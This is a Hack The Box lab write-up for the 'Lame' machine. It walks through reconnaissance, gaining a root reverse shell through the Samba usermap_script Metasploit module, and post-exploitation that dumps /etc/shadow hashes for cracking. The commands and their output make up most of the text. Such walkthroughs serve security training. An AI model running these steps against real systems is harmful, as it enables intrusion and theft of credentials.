---
sidebar_position: 2
---

# Lame

_Level: Easy_

_IP address: **10.10.10.3**_

_Exploit: **SMB**_

## Reconnaissance

TCA proposed method:

<pre>
nmap -A -T4 -p- 10.10.10.3
</pre>

However, I'm using this time the following script:

<pre>
nmap -sC -sV -O -oA nmap/initial 10.10.10.4
</pre>

- <b>-sC</b>: run default nmap scripts
- <b>-sV</b>: detect service version
- <b>-O</b>: detect OS
- <b>-oA</b>: output all formats and store in the nmap/initial file

```
┌──(root㉿kali)-[/home/kali/workshop/lame]
└─# nmap -sC -sV -O -oA nmap/initial 10.10.10.3
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-23 13:36 EST
Nmap scan report for 10.10.10.3
Host is up (0.29s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.16.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-11-23T13:38:09-05:00
|_clock-skew: mean: 2h31m30s, deviation: 3h32m09s, median: 1m29s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.43 seconds
zsh: segmentation fault  nmap -sC -sV -O -oA nmap/initial 10.10.10.3
```

Intersting findings:

`21/tcp open ftp vsftpd 2.3.4`  
`ftp-anon: Anonymous FTP login allowed (FTP code 230)`  
`22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)`  
`139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)`  
`445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)`

## Enumeration

Check if we have any kind of login:

<pre>
smbclient -L \\10.10.10.3
</pre>

- <b>-L</b>: List the folders

```
┌──(root㉿kali)-[/home/kali/workshop/lame]
└─# smbclient -L \\10.10.10.3
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP
```

Connect to `temp` folder:

<pre>
smbclient -L \\\\10.10.10.3\\tmp
</pre>

The `smbclient` IP option can have the 2-backslash or 6-backslash format:

<pre>
smbclient -L \\ip_address
</pre>

or

<pre>
smbclient -L \\\\ip_address\\
</pre>

```
┌──(root㉿kali)-[/home/kali/workshop/lame]
└─# smbclient \\\\10.10.10.3\\tmp
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \>
```

```
smb: \> ls
. D 0 Wed Nov 23 14:04:16 2022
.. DR 0 Sat Oct 31 03:33:58 2020
.ICE-unix DH 0 Wed Nov 23 13:56:56 2022
vmware-root DR 0 Wed Nov 23 13:57:23 2022
.X11-unix DH 0 Wed Nov 23 13:57:21 2022
.X0-lock HR 11 Wed Nov 23 13:57:21 2022
5581.jsvc_up R 0 Wed Nov 23 13:57:58 2022
vgauthsvclog.txt.0 R 1600 Wed Nov 23 13:56:55 2022
                7282168 blocks of size 1024. 5386564 blocks available

smb: \> exit
```

I didn't get any benefit out of it.

## Exploitation

### Exploit Samba 3.0.20-Debian

Google search:

<pre>
Samba 3.0.20-Debian exploit
</pre>

Check the links:
[rapid7](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)
[exploit-db](https://www.exploit-db.com/exploits/16320)

Use the exploit provided on **rapid7** link above.

Run `metasploit`

<pre>
msfconsole
</pre>
<pre>
msf6 > use exploit/multi/samba/usermap_script
</pre>

```

msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) >

```

<pre>
msf6 exploit(multi/samba/usermap_script) > options
</pre>

```

Module options (exploit/multi/samba/usermap_script):

Name Current Setting Required Description

---

RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Met
asploit
RPORT 139 yes The target port (TCP)

Payload options (cmd/unix/reverse_netcat):

Name Current Setting Required Description

---

LHOST 192.168.229.129 yes The listen address (an interface may be specified)
LPORT 4444 yes The listen port

Exploit target:

Id Name

---

0 Automatic

```

The target host `rhost` has to be set to the target machine IP address

<pre>
set rhost 10.10.10.3
</pre>

The `lhost`, i.e. the attacker's machine IP address is already set to `192.168.229.129`. However, this is the `inet` under `eth0`. We need to use the `inet` located under `tun0`.

<pre>
ipconfig
</pre>

```

┌──(kali㉿kali)-[~]
└─$ ifconfig
...
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
inet 192.168.229.129 netmask 255.255.255.0 broadcast 192.168.229.255
...
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500
inet 10.10.16.3 netmask 255.255.254.0 destination 10.10.16.3
...

```

Accordngly, we'll have to set the `lhost` as well:

<pre>
set lhost 10.10.16.3
</pre>

View targets (for this particular exploit, there is only one - default - target):

<pre>
msf6 exploit(multi/samba/usermap_script) > show targets
</pre>

```

msf6 exploit(multi/samba/usermap_script) > show targets

Exploit targets:

Id Name

---

0 Automatic

```

Open the shell:

<pre>
exploit
</pre>

```

msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.16.3:4444
[*] Command shell session 1 opened (10.10.16.3:4444 -> 10.10.10.3:51162) at 2022-11-24 14:26:41 -0500

whoami
root
hostname
lame

```

We got in the linux host machine and can perform practilly all linux commands.
Our intention is to find the flags, which are represented by the files `root.txt` and `user.txt`.

<pre>
cd root
</pre>

<pre>
ls
</pre>

```

ls
Desktop
reset_logs.sh
root.txt
vnc.log

```

We found by chance the `root.txt` file in the `root` directory.

Use `locate` to search for `user.txt`.

<pre>
locate user.txt
</pre>

It looks like `locate` doesn't work.
However, if we run `updatedb`, it will yield the expected outcome:

<pre>
updatedb
</pre>

```
updatedb
locate root.txt
/root/root.txt
locate user.txt
/home/makis/user.txt
/usr/share/doc/fontconfig-config/fontconfig-user.txt.gz
```

In case `locate` doesn't work, we can use the `find` command:

<pre>
find / -type f -name root.txt
</pre>

```

find / -type f -name root.txt
/root/root.txt

```

<pre>
find / -type f -name user.txt
</pre>

```
find / -type f -name user.txt
/home/makis/user.txt
```

Retrieve the flags hash for submission to Hack the Box:

```
cat /home/makis/user.txt
cat /root/root.txt
```

### Exploit vsftpd 2.3.4

Google search:

<pre>
vsftpd 2.3.4 exploit
</pre>

We could use [rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)'s exploit.

### FTP

We can also `ftp` to the machine:

<pre>
ftp 10.10.10.3
</pre>

```
┌──(root㉿kali)-[/home/kali/workshop/lame]
└─# ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||54063|).
150 Here comes the directory listing.
226 Directory send OK.
ftp>
```

After logging in and running `ls`, we didn't find anything interesting.

## Post Exploitation

As a `root` user, we can try to get the passwords:

<pre>
cat /etc/passwd
</pre>

However, the output is as follows:

```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
makis:x:1003:1003::/home/makis:/bin/sh
```

where <b>x</b> denotes the fact, that the passwords are not stored in this particular file.

So, to obtain the users' password hash, we need to run:

<pre>
cat /etc/shadow
</pre>

```
cat /etc/shadow
root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:0:99999:7:::
...
makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:17239:0:99999:7:::
```

The password hash is located after the first colon.

Now, we'll try to crack the root password.

Save both the `passwd` and `shadow` file contents into 2 files with the respective names.

Run `unshadow`

<pre>
unshadow passwd shadow
</pre>

As a result, we got an unshadowed `passwd` file.

```
┌──(root㉿kali)-[/home/kali/workshop/lame]
└─# unshadow passwd shadow
Created directory: /root/.john
root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:0:0:root:/root:/bin/bash
...
makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:1003:1003::/home/makis:/bin/sh
```

**_TODO_**:
Further, we can use `Hashcat` to crack the password.
